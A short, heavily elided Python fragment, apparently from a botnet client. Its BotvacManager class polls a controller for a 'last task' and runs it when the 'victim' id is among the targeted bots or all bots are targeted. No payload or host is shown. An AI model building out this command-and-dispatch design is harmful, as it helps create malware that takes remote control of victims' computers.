...
class BotvacManager:
    ...
    def update_last_task(self):
        ...
        respo = self.reqs_respo.post(url=url, data=body)
    ...
    def _run_task_routine(self):
        if self.update_last_task() and self.last_task and self.last_task.task_type and (self.victim_id in self.last_task.bots or self.last_task.bots == '*'):
                self.run_last_task()
